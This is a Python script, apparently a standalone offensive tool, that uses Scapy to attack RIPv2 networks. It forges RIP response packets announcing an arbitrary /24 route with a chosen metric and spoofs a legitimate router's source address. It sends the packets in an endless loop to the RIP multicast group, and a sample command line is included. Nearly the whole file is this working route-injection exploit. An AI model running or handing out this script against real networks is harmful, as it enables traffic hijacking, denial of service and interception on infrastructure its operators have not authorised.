#! /usr/bin/env python

"""
This script is used to attack a RIPv2 routed network, by injecting malicious
packets into the network.

### Sample command
./rip-spoofer.py -n 172.17.66.0 -m 14 -s 172.17.253.1 -i ens33
"""

import sys
import argparse

"""
Import Scapy avoiding error printing on the console
"""
sys.stderr = None
from scapy.all import *
sys.stderr = sys.__stderr__

if __name__ == '__main__':

	"""
	Getting arguments from the command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-n", "--network", help="The /24 network to announce")
	parser.add_argument("-m", "--metric", help="The metric associated to the announced network")
	parser.add_argument("-s", "--spoof_ip", help="The source IP address to spoof")
	parser.add_argument("-d", "--dst_ip", default="224.0.0.9", help="The destination IP address (will use 224.0.0.9 if not defined)")
	parser.add_argument("-i", "--iface", help="The interface to use for sniffing and sending packets")
	args = parser.parse_args()

	if 	(args.network == None or
		args.metric == None or
		args.spoof_ip == None or
		args.iface == None):
		
		parser.print_help()
		sys.exit(1)
	
	#################################################
	# Initial configuration 			#
	#################################################

	print("[+] Starting the attack...")

	"""
	This is the network we are going to announce
	"""
	network = args.network

	"""
	This is the metric associated to the announced network
	"""
	metric = int(args.metric)

	"""
	This is the source IP address we are going to use while generating the packets.
	Thanks to the fact that RIP is using port 520/UDP, there is no handshake and hence
	the source IP address can be spoofed without any trouble.
	"""
	spoof_ip = args.spoof_ip

	"""
	The destination address of the malicious packages. If not defined, the default
	RIP multicast address (224.0.0.9) is used.
	"""
	dst_ip = args.dst_ip

	"""
	This is the interface to use for sending packets.
	"""
	iface = args.iface

	#################################################
	# Prepare the malicious packet 	 		#
	#################################################

	print("[+] Preparing the malicious packet...")

	"""
	The RIP protocol sucks. This is the description of the ports used by the protocol,
	DEPENDING THE TYPE OF MESSAGE THAT IS GOING TO BE SEND:

	"RIP is a UDP-based protocol. Each router that uses RIP has a routing
	 process that sends and receives datagrams on UDP port number 520, the
	 RIP-1/RIP-2 port. All communications intended for another routers's
	 RIP process are sent to the RIP port. All routing update messages
	 are sent from the RIP port. Unsolicited routing update messages have
	 both the source and destination port equal to the RIP port. Update
	 messages sent in response to a request are sent to the port from
	 which the request came. Specific queries may be sent from ports
	 other than the RIP port, but they must be directed to the RIP port on
	 the target machine." [RFC 2453]

	The result is that, for sending unsolicited request messages, the source
	and the destination port used are the 520/UDP. lmao.
	"""
	
	pkt_evil = Ether()/IP(dst=dst_ip)/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/RIPEntry(AF="IP", RouteTag=0, addr=network, mask="255.255.255.0", nextHop="0.0.0.0", metric=metric)
	
	print("[+] Spoofing the source IP address...")

	pkt_evil[IP].src = spoof_ip
	
	#################################################
	# Send the malicious packet 	 		#
	#################################################

	print("[+] Start sending injection packets...")

	sendp(pkt_evil, loop=1, inter=2, iface=iface)
